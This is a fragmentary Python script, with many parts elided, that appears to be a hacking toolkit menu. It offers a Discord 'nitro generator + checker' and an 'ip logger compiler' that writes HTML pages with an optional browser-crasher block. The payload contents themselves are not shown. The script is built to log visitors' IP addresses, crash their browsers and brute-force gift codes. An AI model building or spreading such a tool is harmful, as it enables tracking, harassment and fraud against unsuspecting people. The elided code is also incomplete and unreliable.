...
print("1- nitro generator + checker\n2- ip logger compiler")
...
if choice == "1":
    ...
    ascii_title = """
           ...
           _ _                                               _                            _               _             
     _ __ (_) |_ _ __ ___     __ _  ___ _ __   ___ _ __ __ _| |_ ___  _ __     _      ___| |__   ___  ___| | _____ _ __ 
    | '_ \| | __| '__/ _ \   / _` |/ _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|  _| |_   / __| '_ \ / _ \/ __| |/ / _ \ '__|
    | | | | | |_| | | (_) | | (_| |  __/ | | |  __/ | | (_| | || (_) | |    |_   _| | (__| | | |  __/ (__|   <  __/ |   
    |_| |_|_|\__|_|  \___/   \__, |\___|_| |_|\___|_|  \__,_|\__\___/|_|      |_|    \___|_| |_|\___|\___|_|\_\___|_|   
                             |___/                                                                                      
    ...
    os.system("clear")
    c = input("type y to to continue and b to quit -> ")
    if c == "y":
        os.system("clear")
        colorama.init()
        ...
        V1 nitro generateur + checker

        """ "\033[37m" )
        num=input('    ➤ Combien De nitro veut tu generé : ')
...
if choice == "2":
    ...
    s = input("continue type y and to return to quit -> ")
    ...
    if s == "y":
        ...
        ascii_title = """
         ...
         _         _                                                         _ _           
        (_)_ __   | | ___   __ _  __ _  ___ _ __    ___ ___  _ __ ___  _ __ (_) | ___ _ __ 
        | | '_ \  | |/ _ \ / _` |/ _` |/ _ \ '__|  / __/ _ \| '_ ` _ \| '_ \| | |/ _ \ '__|
        | | |_) | | | (_) | (_| | (_| |  __/ |    | (_| (_) | | | | | | |_) | | |  __/ |   
        |_| .__/  |_|\___/ \__, |\__, |\___|_|     \___\___/|_| |_| |_| .__/|_|_|\___|_|   
          |_|              |___/ |___/                                |_|                  
        ...
        */
        ...
        if browser_crasher == "y":
            ...
            with open(f"compiled/{file_name}.html", "+a") as file:
                file.write(index + "\n" + crasher_browser + "\n" + index2 + "\n" + index3 + "\n" + page)
            with open(f"compiled/{file_name}_X_200.html", "+a") as file:
                file.write(page)
            with open(f"compiled/{file_name}_x_300.html", "+a") as file:
                file.write(page2)
            with open(f"compiled/{file_name}_x_300.html", "+a") as file:
                file.write(page3)
                

            with open(f"compiled/css/style.css", "+a") as file:
                file.write(stylecss)
            
            with open("compiled/css/bootstrap.css", "+a") as file:
                file.write(bootstrapcss)
                    
            with open("compiled/css/lightbox.css", "+a") as file:
                file.write(css3)


            print(Fore.LIGHTGREEN_EX + "Website compiled ! (put the pictures in the folder of your website")
            input("...")
